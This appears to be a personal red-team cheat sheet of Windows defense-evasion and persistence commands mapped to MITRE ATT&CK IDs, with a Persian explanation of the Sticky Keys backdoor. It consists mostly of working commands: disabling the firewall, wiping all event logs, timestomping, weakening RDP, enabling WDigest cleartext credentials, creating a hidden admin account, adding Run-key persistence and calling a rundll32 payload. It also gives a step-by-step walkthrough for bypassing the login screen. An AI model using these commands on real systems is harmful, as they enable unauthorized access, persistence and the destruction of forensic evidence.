
Impair Defenses =>

  

Disable or modify system Firewall T1562.004

  

```cmd

netsh advfirewall set allprofiles state off

```

  

Impair Command history Logging T1562.003

  

Indicator Removal =>

  

Clear Windows Event Logs T1070.001

  

```powershell

for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"

```

  
  

File Deletion T1070.004

  

Timestopm T1070.006

```powershell

ls .\changetime.txt

Get-ChildItem .\changetime.txt | % { $_.LastWriteTime = "01/01/1970 00:00:00" }

```

  

Modify Registry T1112

  
  

```powershell

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

```

```powershell

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

  

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d

```

```powershell

"C:\Windows\system32\sethcs.exe" /f

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v soheilsec /t REG_DWORD /d 0 /f

```

```powershell

reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

```

  

```powershell

net user soheilsec P@ssw0rd /ad&net localgroup administrators soheilsec /ad& WMIC USERACCOUNT WHERE Name='soheilsec' SET PasswordExpires=FALSE

```

  
  

```powershell

reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

```

  
  
  

```powershell

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Narrator.exe" /v Debugger /t REG_SZ /d "C:\Windows\system32\cmd.exe" /f

```

  
  

```powershell

reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

```

```powershell

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

```

```powershell

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

```

  
  
  

```powershell

reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 4499 /f

```

  

```powershell

REG ADD HKLM\SOFTWARE\Microsoft\Powershell\1\ShellIDs\Microsoft.Powershell /v executionpolicy /t REG_sz /d bypass /f

```

```powershell

REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "microsoft" /t REG_SZ /F /D "c:\windows\IME\IMEKR\DICTS\vshost.exe"

```

  ---
  

```powershell

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\system32\cmd.exe" /f

```

۲. واقعاً چه کار می‌کنه؟ (عملکرد فنی)وقتی ۵ بار پشت سر هم کلید Shift رو بزنی:

1. ویندوز یه پیام سیستم (WM_SYSCOMMAND) می‌فرسته.
2. این پیام به sethc.exe می‌رسه.
3. sethc.exe یه دیالوگ باکس باز می‌کنه که می‌پرسه:
    
    "آیا می‌خواهید Sticky Keys را فعال کنید؟"
    

اما فقط Sticky Keys نیست!این برنامه چندین ابزار دسترسی‌پذیری رو کنترل می‌کنه:

|ابزار|توضیح|
|---|---|
|Sticky Keys|کلیدهای Ctrl, Alt, Shift رو "چسبنده" می‌کنه (مثلاً Ctrl + Alt + Del → یکی یکی بزنی)|
|Filter Keys|کلیدهای تکراری رو فیلتر می‌کنه (برای افرادی که دستشون می‌لرزه)|
|Toggle Keys|صدا می‌ده وقتی Caps Lock یا Num Lock روشن/خاموش می‌شه|
|High Contrast|تم ویندوز رو به حالت کنتراست بالا می‌بره (برای نابینایان جزئی)|

پس sethc.exe یه مرکز کنترل دسترسی‌پذیری هست، نه فقط Sticky Keys!

بله، دقیق‌تر و گام‌به‌گام توضیح می‌دم که وقتی این دستور رو تو cmd با دسترسی ادمین اجرا می‌کنی، دقیقاً چه اتفاقی می‌افته.

---

دستور:

reg

```text
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\system32\cmd.exe" /f
```

---

گام‌به‌گام چیکار می‌کنه؟۱. مسیر رجیستری:

```text
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe
```

- این یک کلید خاص در رجیستری ویندوز هست.
- ویندوز وقتی می‌خواد یک برنامه رو اجرا کنه، اول این مسیر رو چک می‌کنه.
- اگه برنامه‌ای مثل sethc.exe اینجا باشه، ویندوز فکر می‌کنه "آها، این برنامه یه دیباگر داره!"

---

۲. sethc.exe چیه؟

- نام فایل: Sticky Keys (کلیدهای چسبنده)
- مسیر: C:\Windows\System32\sethc.exe
- کارش: وقتی ۵ بار Shift بزنی، این برنامه اجرا می‌شه و پنجره Sticky Keys باز می‌شه.

---

۳. /v Debugger یعنی چی؟

- یه مقدار (Value) به اسم Debugger در اون کلید رجیستری می‌سازه.
- نوعش: REG_SZ (رشته متنی)
- مقدارش: C:\Windows\system32\cmd.exe

یعنی به ویندوز می‌گه:  
"هر وقت sethc.exe اجرا شد، به جای خودش، cmd.exe رو اجرا کن!"

---

۴. /f یعنی چی؟

- Force = بدون تأیید، اجباراً بنویس.
- اگه قبلاً مقداری وجود داشت، پاکش کن و اینو بذار.

---

حالا چی می‌شه؟ (تغییر رفتار سیستم)

|قبل از دستور|بعد از دستور|
|---|---|
|۵ بار Shift → Sticky Keys باز می‌شه|۵ بار Shift → Command Prompt باز می‌شه|
|دسترسی: کاربر عادی|دسترسی: SYSTEM (بالاترین سطح)|
|فقط در دسکتاپ|در صفحه لاگین هم کار می‌کنه!|

---

مثال واقعی (هک قفل ویندوز)فرض کن سیستم قفل شده و رمز رو فراموش کردی:

1. سیستم رو ری‌استارت کن → برو به صفحه ورود (Login Screen)
2. ۵ بار سریع کلید Shift رو فشار بده
3. یه پنجره cmd باز می‌شه (بدون نیاز به لاگین!)
4. دستور بزن:
    
    cmd
    
    ```text
    net user administrator /active:yes
    net user administrator 12345
    ```
    
5. سیستم رو ری‌استارت کن → با administrator و رمز 12345 وارد شو!

یعنی قفل ویندوز رو کامل دور زدی!

---

این فقط برای sethc.exe نیست!می‌تونی همین کار رو با برنامه‌های دیگه هم بکنی:

- utilman.exe → Ease of Access (Win + U)
- osk.exe → کیبورد روی صفحه
- narrator.exe → راوی

مثال:

reg

```text
REG ADD "HKLM\...\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f
```

→ حالا Win + U در صفحه لاگین → cmd باز می‌کنه!

---

چطور اینو پاک کنیم؟ (برگردونیم به حالت عادی)

reg

```text
REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f
```

یا دستی تو regedit بری و کلید Debugger رو حذف کنی.

---

خلاصه خیلی ساده:

|کار|نتیجه|
|---|---|
|دستور رو اجرا کنی|۵ بار Shift = cmd با دسترسی SYSTEM|
|در صفحه لاگین هم کار می‌کنه|می‌تونی رمز رو ریست کنی|
|بدون رمزگذاری درایو|خطرناکه!|

---

توصیه امنیتی:

- BitLocker روشن کن
- رمز BIOS بذار
- دسترسی فیزیکی به سیستم رو محدود کن

---





```powershell

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v soheilsec /t REG_DWORD /d 0 /f

```

  
  
  
  

Obfuscated Files or information =>

  

Software Packing T1027.002

  
  

System Binary Proxy Execution =>

  

Compiled Html File T1218.001

  

Rundll32 T1218.011

  

rundll32.exe payload.dll,0


---
	
	T1562.004
	T1562.003
	T1070.001 
	T1070.006
	T1112 
	T1218.001 
	T1218.011
